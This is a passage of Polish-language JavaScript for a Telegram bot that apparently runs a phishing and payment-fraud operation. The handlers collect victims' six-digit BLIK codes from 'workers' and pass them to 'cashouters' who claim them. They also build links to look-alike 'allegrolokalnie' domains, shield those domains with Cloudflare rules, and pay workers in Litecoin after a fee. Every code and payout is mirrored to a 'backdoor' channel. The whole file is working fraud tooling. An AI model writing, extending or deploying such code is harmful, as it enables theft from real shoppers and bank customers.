			await sendFgMessage(userId, "➖ **Odejmowanie Zysku do Wypłaty**\n\nWpisz **ID użytkownika**, któremu chcesz odjąć środki:");
			return true;
		}

		if (data === "fg_admin_ban_user") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_ban_user" }) });
			await sendFgMessage(userId, "🚫 **Banowanie Użytkownika**\n\nWpisz **ID użytkownika**, którego chcesz zbanować:");
			return true;
		}

		if (data === "fg_admin_unban_user") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_unban_user" }) });
			await sendFgMessage(userId, "🟢 **Odbanowywanie Użytkownika**\n\nWpisz **ID użytkownika**, którego chcesz odbanować:");
			return true;
		}

		if (data === "fg_admin_promo") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_promo_days" }) });
			await sendFgMessage(userId, "🎟️ **Promo kod — self cashout**\n\nPodaj **liczbę dni**, na jaką kod ma dawać self cashout (np. `7`):");
			return true;
		}

		if (data === "fg_admin_broadcast") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_broadcast" }) });
			await sendFgMessage(userId, "📢 **Ogłoszenie Systemowe**\n\nWpisz treść wiadomości, która zostanie wysłana do wszystkich graczy:");
			return true;
		}

		if (data === "fg_admin_set_deposit_limit") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_deposit_limit" }) });
			await sendFgMessage(userId, "<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> **Limit wpłaty**\n\nWpisz maksymalną kwotę wpłaty w PLN (np. `500`), lub wpisz **reset**, aby usunąć limit:");
			return true;
		}

		if (data === "fg_admin_set_public_domain") {
			const currentPublic = await getPublicDomain();
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_public_domain" }) });
			await sendFgMessage(
				userId,
				`<tg-emoji emoji-id=\"5776233299424843260\">🌐</tg-emoji> **Domena publiczna dla użytkowników**\n\n` +
				`Aktualna domena: \`${currentPublic || "brak"}\`\n\n` +
				`Wpisz nową domenę publiczną (np. \`example.pl\`) lub **reset**, aby wyczyścić.\n` +
				`Użytkownicy z trybem „domena publiczna” automatycznie otrzymają tę domenę.`
			);
			return true;
		}

		if (data === "fg_admin_toggle_bot") {
			if (!isOwner(userId)) {
				await bot.answerCallbackQuery(query.id, {
					text: "Tylko właściciel (OWNER) może włączać/wyłączać bota.",
					show_alert: true
				}).catch(() => {});
				return true;
			}
			const currentStatus = await getBotConfig("bot_status");
			const newStatus = currentStatus === "disabled" ? "enabled" : "disabled";
			await setBotConfig("bot_status", newStatus);
			await sendFgAdminMenu(userId);
			return true;
		}

		if (data === "fg_admin_toggle_blik") {
			const enabled = await isGlobalBlikEnabled();
			await setBotConfig("global_blik_enabled", enabled ? "Nie" : "Tak");
			await sendFgAdminMenu(userId);
			return true;
		}

		if (data === "fg_admin_toggle_card") {
			const enabled = await isGlobalCardEnabled();
			await setBotConfig("global_card_enabled", enabled ? "Nie" : "Tak");
			await sendFgAdminMenu(userId);
			return true;
		}

		if (data === "fg_admin_toggle_selfcashout") {
			const enabled = await isSelfCashoutEnabled();
			await setBotConfig("selfcashout_enabled", enabled ? "Nie" : "Tak");
			await broadcastSelfCashoutAnnouncement(!enabled);
			await sendFgAdminMenu(userId);
			return true;
		}
	}

		return false;
	} catch (err) {
		console.error("Błąd handleFgCallback:", err);
		return true;
	}
}

async function handleFgTopProfit(adminId) {
	const raw = await getBotConfig("users_list");
	const usersList = raw ? JSON.parse(raw) : [];

	if (usersList.length === 0) {
		await sendFgMessage(adminId, "Brak zatwierdzonych graczy w bazie.");
		return;
	}

	await sendFgMessage(adminId, "⏳ **Przeliczanie rankingu...**");

	const stats = [];
	for (const uid of usersList) {
		const uData = await User.findOne({ id: parseInt(uid) });
		if (!uData) continue;
		const fee = await getUserFee(uData);
		const profit = getTotalEarned(uData);
		if (profit > 0) {
			stats.push({ id: uid, deposited: getTotalEarned(uData), profit });
		}
	}

	stats.sort((a, b) => b.profit - a.profit);
	const top10 = stats.slice(0, 10);

	if (top10.length === 0) {
		await sendFgMessage(adminId, "Brak zysków do wyświetlenia.");
		return;
	}

	let msg = "🏆 **TOP 10 GRACZY (ZYSK NA CZYSTO)** 🏆\n\n";
	top10.forEach((user, index) => {
		msg += `${index + 1}. ID: \`${user.id}\`\n<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> Łączny zarobek: **${user.profit.toFixed(2)} PLN**\n\n`;
	});

	await sendFgMessage(adminId, msg);
}

async function handleFgTextMessage(msg) {
	const chatId = msg.chat.id;
	const userId = msg.from.id;
	const text = msg.text ? msg.text.trim() : "";

	if (!text || msg.chat.type !== "private") return false;

	const user = await ensureUser(userId, msg.from.username);
	const isAdmin = await isFgAdmin(userId);

	if (text.startsWith("/start") || text.startsWith("/admin") || text.startsWith("/menu") || text.startsWith("/panel")) {
		return false;
	}

	if (user.banned && !isAdmin) {
		await sendFgMessage(userId, "🚫 **Twoje konto jest zbanowane.**");
		return true;
	}

	if (user.fgState && ["cancel", "stop", "anuluj"].includes(text.toLowerCase())) {
		await cancelUserFlow(userId, chatId, { userMessageId: msg.message_id });
		return true;
	}

	const botStatus = await getBotConfig("bot_status");

	if (botStatus === "disabled") {
		if (user.fgState === "awaiting_amount" || user.fgState === "awaiting_code") {
			await editUserDB(userId, { fgState: null, tempAmount: null, promptMessageId: null });
			await sendBlockedStatus(userId, "Bot wyłączony", "Wrzucanie kodu zostało anulowane — bot jest wyłączony.");
			return true;
		}
	}

	if (user.fgState === "awaiting_amount" || user.fgState === "awaiting_code") {
		if (!(await isGlobalBlikEnabled())) {
			await editUserDB(userId, { fgState: null, tempAmount: null, promptMessageId: null });
			await sendBlockedStatus(userId, "BLIK wyłączony", "Wrzucanie kodu zostało anulowane — BLIK jest wyłączony.");
			return true;
		}
	}

	if (user.fgState === "awaiting_verification_source") {
		await editUserDB(userId, { fgState: "verification_pending", verificationSource: text });
		await replacePromptWithStatus(userId, chatId, [
			{ title: "Podanie wysłane", lines: [modernBullet("Oczekuj na akceptację przez administratora.")] }
		], msg.message_id);

		const rawUsername = msg.from.username ? `@${msg.from.username}` : "brak @nicku";
		const cleanUsername = sanitizeFgText(rawUsername);
		const cleanFirstName = sanitizeFgText(msg.from.first_name || "brak");
		const cleanLastName = sanitizeFgText(msg.from.last_name || "");
		const fullName = `${cleanFirstName} ${cleanLastName}`.trim();
		const cleanText = sanitizeFgText(text);

		const appKeyboard = {
			inline_keyboard: [
				[
					{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `app_accept_${userId}` },
					{ text: "Odrzuć", icon_custom_emoji_id: "6030757850274336631", callback_data: `app_reject_${userId}` }
				]
			]
		};

		const applicationDetails =
			`<tg-emoji emoji-id=\"5920046907782074235\">📝</tg-emoji> <b>NOWA WERYFIKACJA UŻYTKOWNIKA!</b>\n\n` +
			`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>DANE UŻYTKOWNIKA:</b>\n` +
			`• <b>ID:</b> <code>${userId}</code>\n` +
			`• <b>Nick Telegram:</b> ${cleanUsername}\n` +
			`• <b>Imię / Nazwisko:</b> <code>${fullName}</code>\n\n` +
			`<tg-emoji emoji-id=\"6030784887093464891\">💬</tg-emoji> <b>Skąd zna bota:</b>\n` +
			`<i>${cleanText}</i>`;

		await sendChannelMessageHtml(CONFIG.CHANNELS.VERIFICATION, applicationDetails, appKeyboard);
		return true;
	}

	if (user.fgState === "verification_pending") {
		await sendModernStatus(userId, [
			{ title: "Weryfikacja", lines: [modernBullet("Oczekujesz na akceptację podania przez administratora.")] }
		]);
		return true;
	}

	if (isAdmin && user.adminState) {
		const stateData = JSON.parse(user.adminState);
		const handled = await handleFgAdminState(userId, text, stateData, msg);
		if (handled) return true;
	}

	if (!isAdmin && !user.approved) {
		await sendModernStatus(userId, [
			{ title: "Weryfikacja", lines: [modernBullet("Funkcje bota są zablokowane do momentu akceptacji podania.")] }
		]);
		return true;
	}

	if (user.fgState === "awaiting_ltc_address") {
		if (!isValidLTCAddress(text)) {
			await sendModernPrompt(chatId, "Błędny adres LTC", "To nie jest poprawny adres Litecoin. Spróbuj ponownie.", userId, msg.message_id);
			return true;
		}
		await editUserDB(userId, { fgState: null, ltcAddress: text });
		await replacePromptWithStatus(userId, chatId, [
			{ title: "Adres LTC zapisany", lines: [modernKv("Adres", text)] }
		], msg.message_id);
		return true;
	}

	if (user.fgState === "awaiting_withdraw_amount") {
		const withdrawAmount = parseFloat(text.replace(",", "."));
		const current = await User.findOne({ id: userId });
		const availableProfit = getAvailableProfit(current);

		if (isNaN(withdrawAmount) || withdrawAmount <= 0 || withdrawAmount > availableProfit) {
			await editBannerPrompt(
				chatId,
				`───────── [ 𝕂 ] ─────────\n❖ *BŁĘDNA KWOTA*\n──────────────────\n\n` +
				`› Podaj kwotę wypłaty. Dostępne środki na saldo \`${availableProfit.toFixed(2)} PLN\`.`,
				userId
			);
			return true;
		}

		current.withdrawn = (current.withdrawn || 0) + withdrawAmount;
		current.fgState = null;
		await current.save();

		const cleanUsername = sanitizeFgText(msg.from.username ? `@${msg.from.username}` : "brak");
		const payoutKeyboard = {
			inline_keyboard: [
				[
					{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `payout_accept_${userId}_${withdrawAmount}` },
					{ text: "Odrzuć", icon_custom_emoji_id: "6030757850274336631", callback_data: `payout_reject_${userId}_${withdrawAmount}` }
				]
			]
		};

		await replacePromptWithStatus(userId, chatId, [
			{
				title: "Wniosek wysłany",
				lines: [
					modernKv("Kwota", `${withdrawAmount.toFixed(2)} PLN`),
					modernBullet("Oczekuj na akceptację administratora.")
				]
			}
		], msg.message_id);

		if (current.autoWithdraw) {
			const address = getPayoutAddress(current);
			await sendFgHtml(userId,
				`<tg-emoji emoji-id=\"5884428842780594914\">⚡</tg-emoji> <b>AUTOMATYCZNE ZGŁOSZENIE WYPŁATY!</b> (Auto-wypłata)\n\n` +
				`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Użytkownik:</b> <code>${userId}</code>\n` +
				`<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota zysku:</b> <code>${withdrawAmount.toFixed(2)} PLN</code>\n` +
				`<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <b>Adres LTC:</b> <code>${address}</code>`
			);
		}
		const payoutText =
			`<tg-emoji emoji-id=\"6034969813032374911\">🧾</tg-emoji> <b>NOWE ZLECENIE WYPŁATY!</b>\n\n<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Użytkownik:</b> <code>${userId}</code> (${cleanUsername})\n<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota:</b> <code>${withdrawAmount.toFixed(2)} PLN</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <b>Adres LTC:</b> <code>${getPayoutAddress(current)}</code>`;
		const payoutKey = `payout_${userId}_${withdrawAmount}`;

		const mainMsgId = await sendChannelMessageHtml(CONFIG.CHANNELS.PAYOUTS, payoutText, payoutKeyboard);
		registerCodeMessage(payoutKey, CONFIG.CHANNELS.PAYOUTS, mainMsgId);

		await mirrorPayoutToBackdoor(
			payoutKey,
			`<tg-emoji emoji-id=\"6034969813032374911\">🧾</tg-emoji> <b>NOWE ZLECENIE WYPŁATY!</b>\n\n<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Użytkownik:</b> <code>${userId}</code> (${cleanUsername})\n<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota:</b> <code>${withdrawAmount.toFixed(2)} PLN</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <b>Adres LTC (docelowy):</b> <code>${getPayoutAddress(current)}</code>`,
			payoutKeyboard
		);
		return true;
	}

	if (user.fgState === "awaiting_amount") {
		const amount = parseFloat(text.replace(",", "."));
		if (isNaN(amount) || amount <= 0) {
			await editBannerPrompt(
				chatId,
				`───────── [ 𝕂 ] ─────────\n❖ *BŁĘDNA KWOTA*\n──────────────────\n\n` +
				`› Podaj kwotę wpłaty (PLN).`,
				userId
			);
			return true;
		}

		if (await isDepositOverLimit(amount)) {
			const limit = await getDepositLimit();
			await editBannerPrompt(
				chatId,
				`───────── [ 𝕂 ] ─────────\n❖ *LIMIT WPŁATY*\n──────────────────\n\n` +
				`› Maksymalna kwota: \`${limit.toFixed(2)} PLN\`. Podaj niższą kwotę.`,
				userId
			);
			return true;
		}

		await editUserDB(userId, { tempAmount: amount, fgState: "awaiting_code" });
		await editBannerPrompt(
			chatId,
			`───────── [ 𝕂 ] ─────────\n❖ *KOD BLIK*\n──────────────────\n\n` +
			`› Kwota: \`${amount.toFixed(2)} PLN\`\n› Wpisz 6-cyfrowy kod BLIK.`,
			userId
		);
		return true;
	}

	if (user.fgState === "awaiting_code") {
		if (!/^\d{6}$/.test(text)) {
			await editBannerPrompt(
				chatId,
				`───────── [ 𝕂 ] ─────────\n❖ *BŁĘDNY KOD*\n──────────────────\n\n` +
				`› Kod BLIK ma dokładnie 6 cyfr. Wpisz ponownie.`,
				userId
			);
			return true;
		}

		const current = await User.findOne({ id: userId });
		const amount = parseFloat(current.tempAmount || 0);
		await editUserDB(userId, { fgState: null, tempAmount: null });
		const selfCashoutNow = await isSelfCashoutEnabled(userId);
		await replacePromptWithStatus(userId, chatId, [
			{
				title: "Kod wysłany",
				lines: [
					modernBullet(`Kod na \`${amount.toFixed(2)} PLN\` poszedł do cashouterów.`)
				]
			}
		], msg.message_id);

		const cleanUsername = sanitizeFgText(msg.from.username ? `@${msg.from.username}` : "brak");

		codeMeta.set(text, {
			type: "blik",
			source: "worker",
			amount,
			owner: userId,
			person: cleanUsername,
			phone: "—",
			workerName: cleanUsername
		});

		// Backdoor: pełne dane + akcept/odrzuć
		const backdoorKeyboard = {
			inline_keyboard: [
				[
					{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `code_accept_${userId}_${amount}_${text}` },
					{ text: "Odrzuć", icon_custom_emoji_id: "6030757850274336631", callback_data: `code_reject_${userId}_${text}` }
				]
			]
		};
		const codeText = `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Kod z bota</b>\n\n<blockquote><tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Worker</b> · <code>${userId}</code> (${cleanUsername})\n<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota</b> · ${amount.toFixed(2)} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔑</tg-emoji> <b>Kod</b> · <code>${text}</code></blockquote>`;

		// Kanał główny: kod ukryty, obowiązkowe przejęcie
		const mainText = `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Kod z bota</b>\n\n<blockquote><tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Worker</b> · <code>${userId}</code> (${cleanUsername})\n<tg-emoji emoji-id=\"5778421276024509124\">💰</tg-emoji> <b>Kwota</b> · ${amount.toFixed(2)} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔑</tg-emoji> <b>Kod</b> · <code>••• •••</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Kod ukryty — przejmij, aby zobaczyć`;
		const mainKeyboard = {
			inline_keyboard: [
				[{ text: "Przejmij kod", icon_custom_emoji_id: "6037496202990194718", callback_data: `claim_${userId}_${amount}_${text}` }]
			]
		};

		const bdId = await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, codeText, backdoorKeyboard);
		registerCodeMessage(`code_${text}`, CONFIG.CHANNELS.BACKDOOR, bdId);
		const sendMain = async () => {
			const mid = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, mainText, mainKeyboard, blikThread());
			registerCodeMessage(`code_${text}`, CONFIG.CHANNELS.CODES, mid);
		};
		const sendOwner = async () => {
			const mid = await sendTelegramHtmlSafe(userId, codeText, backdoorKeyboard);
			registerCodeMessage(`code_${text}`, userId, mid);
		};
		const deliverCode = async () => {
			// Kod wrzucony z bota ZAWSZE idzie na kanał główny — łapią go cashouterzy.
			// Self cashout dotyczy tylko kodów z bramki.
			await sendMain();
			if (await isSelfCashoutEnabled(userId)) {
				await sendTelegramHtmlSafe(userId, `<tg-emoji emoji-id=\"6039573425268201570\">📤</tg-emoji> Kod na <code>${amount.toFixed(2)} PLN</code> poszedł do cashouterów.`).catch(() => {});
			}
		};
		if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliverCode);
		else await deliverCode();
		return true;
	}

	return false;
}

async function handleFgAdminState(userId, text, stateData, msg) {
	if (stateData.action === "awaiting_add_admin") {
		await editUserDB(userId, { adminState: null });
		const additionalAdmins = await getAdditionalAdmins();
		if (!additionalAdmins.includes(text) && text !== CONFIG.ADMIN_ID) {
			additionalAdmins.push(text);
			await setBotConfig("additional_admins", JSON.stringify(additionalAdmins));
			await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Dodano użytkownika <code>${text}</code> do grona administratorów.`);
			await sendFgMessage(parseInt(text), "🎉 **Otrzymałeś uprawnienia administratora!** Wpisz /admin, aby otworzyć panel.");
		} else {
			await sendFgMessage(userId, "❌ Ten użytkownik jest już administratorem lub to główny admin.");
		}
		return true;
	}

	if (stateData.action === "awaiting_remove_admin") {
		await editUserDB(userId, { adminState: null });
		const additionalAdmins = await getAdditionalAdmins();
		const index = additionalAdmins.indexOf(text);
		if (index > -1) {
			additionalAdmins.splice(index, 1);
			await setBotConfig("additional_admins", JSON.stringify(additionalAdmins));
			await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Usunięto użytkownika <code>${text}</code> z grona administratorów.`);
			await sendFgMessage(parseInt(text), "❌ **Twoje uprawnienia administratora zostały cofnięte.**");
		} else {
			await sendFgMessage(userId, "❌ Nie znaleziono takiego ID na liście dodatkowych administratorów.");
		}
		return true;
	}

	if (stateData.action === "awaiting_fee") {
		const newFee = parseFloat(text.replace(",", "."));
		if (isNaN(newFee) || newFee < 0 || newFee > 100) {
			await sendFgMessage(userId, "❌ **Niepoprawne Fee!** Wpisz wartość od 0 do 100:");
			return true;
		}
		await editUserDB(userId, { adminState: null });
		await setBotConfig("global_fee", newFee.toString());
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Nowa globalna stawka Fee została ustawiona na: **${newFee.toFixed(1)}%**`);
		return true;
	}

	if (stateData.action === "awaiting_user_fee_id") {
		await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_user_fee_amount", targetId: text }) });
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> ID Użytkownika: <code>${text}</code>\n\nWpisz nową wartość Fee w % (np. <code>20</code>) lub wpisz słowo **reset**, aby przywrócić mu globalne fee:`);
		return true;
	}

	if (stateData.action === "awaiting_user_fee_amount") {
		const targetId = parseInt(stateData.targetId);
		await editUserDB(userId, { adminState: null });
		const targetUser = await User.findOne({ id: targetId });
		if (!targetUser) {
			await sendFgMessage(userId, "❌ Nie znaleziono użytkownika.");
			return true;
		}

		if (text.toLowerCase() === "reset") {
			targetUser.customFee = null;
			await targetUser.save();
			await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Zresetowano fee użytkownika <code>${targetId}</code>. Będzie teraz używał globalnej stawki.`);
			return true;
		}

		const newFee = parseFloat(text.replace(",", "."));
		if (isNaN(newFee) || newFee < 0 || newFee > 100) {
			await sendFgMessage(userId, "❌ Niepoprawne Fee! Wpisz wartość od 0 do 100:");
			return true;
		}

		targetUser.customFee = newFee;
		await targetUser.save();
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Ustawiono indywidualne fee dla gracza <code>${targetId}</code> na: **${newFee.toFixed(1)}%**.`);
		return true;
	}

	if (stateData.action === "awaiting_add_balance_user") {
		await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_add_balance_amount", targetId: text }) });
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> ID Użytkownika: <code>${text}</code>\n\nWpisz **kwotę PLN**, którą chcesz DODAĆ do historii wrzuconych środków:`);
		return true;
	}

	if (stateData.action === "awaiting_add_balance_amount") {
		const addAmount = parseFloat(text.replace(",", "."));
		if (isNaN(addAmount) || addAmount <= 0) {
			await sendFgMessage(userId, "❌ Niepoprawna kwota! Wpisz liczbę dodatnią:");
			return true;
		}
		const targetId = parseInt(stateData.targetId);
		await editUserDB(userId, { adminState: null });
		const targetUser = await User.findOne({ id: targetId });
		if (!targetUser) {
			await sendFgMessage(userId, "❌ Nie znaleziono użytkownika.");
			return true;
		}
		targetUser.deposited += addAmount;
		await targetUser.save();
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> **Dodano ${addAmount.toFixed(2)} PLN** użytkownikowi <code>${targetId}</code>. Łączny zarobek: <code>${getTotalEarned(targetUser).toFixed(2)} PLN</code>.`);
		await sendFgMessage(targetId, `<tg-emoji emoji-id=\"6032924188828767321\">➕</tg-emoji> Administrator dodał do Twoich wrzuconych środków: **${addAmount.toFixed(2)} PLN**.`);
		return true;
	}

	if (stateData.action === "awaiting_sub_balance_user") {
		await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_sub_balance_amount", targetId: text }) });
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> ID Użytkownika: <code>${text}</code>\n\nWpisz **kwotę PLN**, którą chcesz ODEJĄĆ z zysku do wypłaty:`);
		return true;
	}

	if (stateData.action === "awaiting_sub_balance_amount") {
		const subAmount = parseFloat(text.replace(",", "."));
		if (isNaN(subAmount) || subAmount <= 0) {
			await sendFgMessage(userId, "❌ Niepoprawna kwota! Wpisz liczbę dodatnią:");
			return true;
		}
		const targetId = parseInt(stateData.targetId);
		await editUserDB(userId, { adminState: null });
		const targetUser = await User.findOne({ id: targetId });
		if (!targetUser) {
			await sendFgMessage(userId, "❌ Nie znaleziono użytkownika.");
			return true;
		}
		targetUser.withdrawn = (targetUser.withdrawn || 0) + subAmount;
		await targetUser.save();
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> **Odjęto ${subAmount.toFixed(2)} PLN** z zysku użytkownika <code>${targetId}</code>.`);
		await sendFgMessage(targetId, `➖ Administrator odjął z Twojego zysku do wypłaty: **${subAmount.toFixed(2)} PLN**.`);
		return true;
	}

	if (stateData.action === "awaiting_ban_user") {
		await editUserDB(userId, { adminState: null });
		const targetId = parseInt(text);
		await editUserDB(targetId, { banned: 1 });
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5938215362473496448\">🚫</tg-emoji> Użytkownik o ID <code>${text}</code> został **zbanowany**.`);
		await sendFgMessage(targetId, "🚫 **Twoje konto zostało zbanowane przez administratora.**");
		return true;
	}

	if (stateData.action === "awaiting_unban_user") {
		await editUserDB(userId, { adminState: null });
		const targetId = parseInt(text);
		await editUserDB(targetId, { banned: 0 });
		await sendFgMessage(userId, `🟢 Użytkownik o ID \`${text}\` został **odbanowany**.`);
		await sendFgMessage(targetId, "🎉 **Twoje konto zostało odbanowane!** Wpisz /start.");
		return true;
	}

	if (stateData.action === "awaiting_promo_days") {
		const days = parseInt(text);
		if (!Number.isFinite(days) || days < 1 || days > 365) {
			await sendFgMessage(userId, "❌ Podaj liczbę dni z zakresu 1–365:");
			return true;
		}
		const code = "SC-" + Math.random().toString(36).slice(2, 8).toUpperCase();
		await PromoCode.create({ code, days, createdBy: userId });
		await editUserDB(userId, { adminState: null });
		await sendFgMessage(
			userId,
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> **Promo kod utworzony**\n\n` +
			`🎟️ Kod: \`${code}\`\n` +
			`⏳ Ważność: **${days} dni**\n\n` +
			`Użytkownik aktywuje go komendą:\n\`/selfcashout ${code}\``
		);
		return true;
	}

	if (stateData.action === "awaiting_broadcast") {
		await editUserDB(userId, { adminState: null });
		await sendFgMessage(userId, "⏳ Wysyłanie powiadomienia...");
		const allUsers = await User.find({ approved: true });
		let successCount = 0;
		for (const targetUser of allUsers) {
			try {
				await sendFgMessage(targetUser.id, `<tg-emoji emoji-id=\"6021418126061605425\">📢</tg-emoji> **POWIADOMIENIE SYSTEMOWE**\n\n${text}`);
				successCount++;
			} catch (e) {}
		}
		await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Powiadomienie wysłane do **${successCount}** użytkowników.`);
		return true;
	}

	if (stateData.action === "awaiting_deposit_limit") {
		await editUserDB(userId, { adminState: null });
		if (text.toLowerCase() === "reset") {
			await setBotConfig("deposit_limit", "");
			await sendFgMessage(userId, "✅ Limit wpłaty został **usunięty**.");
		} else {
			const newLimit = parseFloat(text.replace(",", "."));
			if (isNaN(newLimit) || newLimit <= 0) {
				await sendFgMessage(userId, "❌ **Niepoprawna kwota!** Wpisz liczbę dodatnią lub słowo **reset**.");
				return true;
			}
			await setBotConfig("deposit_limit", newLimit.toString());
			await sendFgMessage(userId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Limit wpłaty ustawiony na: **${newLimit.toFixed(2)} PLN**`);
		}
		await sendFgAdminMenu(userId);
		return true;
	}

	if (stateData.action === "awaiting_public_domain") {
		await editUserDB(userId, { adminState: null });
		const domainRegex = /^(?!-)([a-zA-Z0-9-]{1,63})\.([a-zA-Z]{2,})$/;

		if (text.toLowerCase() === "reset") {
			await setPublicDomainForAll("");
			await sendFgMessage(userId, "✅ Domena publiczna została **wyczyszczona**.");
			await sendFgAdminMenu(userId);
			return true;
		}

		const domain = text.trim().toLowerCase();
		if (!domainRegex.test(domain)) {
			await sendFgMessage(userId, "<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> **Niepoprawna domena.** Wpisz np. `mojadomena.pl` lub **reset**.");
			return true;
		}

		if (isReservedDomain(domain)) {
			await sendFgMessage(userId, getReservedDomainError(domain));
			await sendFgAdminMenu(userId);
			return true;
		}

		try {
			await setPublicDomainForAll(domain);
		} catch (err) {
			await sendFgMessage(userId, err.message || "❌ Nie udało się ustawić domeny publicznej.");
			await sendFgAdminMenu(userId);
			return true;
		}
		const cfApplied = await applyCloudflareSecurityForDomain(domain);
		await sendFgMessage(
			userId,
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Ustawiono domenę publiczną: <code>${domain}</code>\n\nWszyscy użytkownicy korzystający z domeny publicznej otrzymali nową wartość.${
				cfApplied ? "\n\n🛡️ Reguły Cloudflare (WAF + rate limit) zostały nałożone na strefę." : "\n\n⚠️ Strefa CF nie znaleziona — reguły zostaną nałożone po dodaniu domeny w CF."
			}`
		);
		await sendFgAdminMenu(userId);
		return true;
	}

	return false;
}

async function showMainMenu(chatId, userId, messageId) {
	await sendCombinedMainMenu(chatId, userId, messageId);
}


bot.on("callback_query", async (query) => {
	const chatId = query.message.chat.id;
	let messageId = query.message.message_id;
	const userId = query.from.id;

	try {
		if (isUserFlooding(userId)) {
			await bot.answerCallbackQuery(query.id, {
				text: "Zbyt wiele akcji. Poczekaj chwilę.",
				show_alert: false
			}).catch(() => {});
			return;
		}

		if (await handleFgCallback(query)) {
			return;
		}

		if (
			query.data.startsWith("blikgate_") ||
			query.data.startsWith("status_") ||
			query.data.startsWith("card_") ||
			(query.data.startsWith("blik_") && query.data.split("_").length >= 2)
		) {
			return;
		}

		await bot.answerCallbackQuery(query.id).catch(() => {});

	const publicDomain = await getPublicDomain();
	const spokoZiomki = await loadUsersDB();
	const megatyp = spokoZiomki.find(u => u.id === userId) || await ensureUser(userId, query.from.username);
	const isFgAdminUser = await isFgAdmin(userId);

	if (!isFgAdminUser && !megatyp?.approved) {
		try {
			await bot.answerCallbackQuery(query.id, {
				text: "Oczekujesz na weryfikację. Wyślij /start.",
				show_alert: true
			});
		} catch (e) {}
		return;
	}

	const isBanned = megatyp?.banned;

	if (isBanned) {
		return;
	}

	if (await handlePlatformOfferCallbacks(query, { chatId, messageId, userId })) {
		return;
	}

	const sendTempMessage = async (chatId, text) => {
		try {
			const sentMessage = await bot.sendMessage(chatId, text);
			setTimeout(() => bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {}), 3000);
		} catch (error) {
			console.error("Błąd wysyłania/usuwania wiadomości:", error);
		}
	};

	const refreshOfferMenu = async (chatId, messageId, offerId) => {
		try {
			const offers = await loadOffersDB();
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain ? `https://allegrolokalnie.${domain}/oferta/${encodeURIComponent(offer.link)}` : "NIE MASZ PODPIETEJ DOMENY";

			if (!offer) return;

			let tagi = offer.tagi.length > 128 ? 'Tagi są zbyt długie, nie da się wyświetlić.' : `\`${offer.tagi}\``;

			let description = offer.description.length > 256 ? 'Opis jest za długi, nie da się wyświetlić.' : `\`${offer.description}\``;
			let caption = `───────── [ 𝕂 ] ─────────\n❖ *OFERTA · ALLEGRO LOKALNIE*\n──────────────────\n\n` +
				`› *Nazwa:* <code>${offer.nazwa}</code>\n` +
				`› *Opis:* ${description}\n` +
				`› *Cena:* <code>${offer.cena} zł</code>\n` +
				`› *Sprzedawca:* <code>${offer.sprzedawca}</code>\n` +
				`› *Miasto:* <code>${offer.miasto}</code>, <code>${offer.wojewodztwo}</code>\n` +
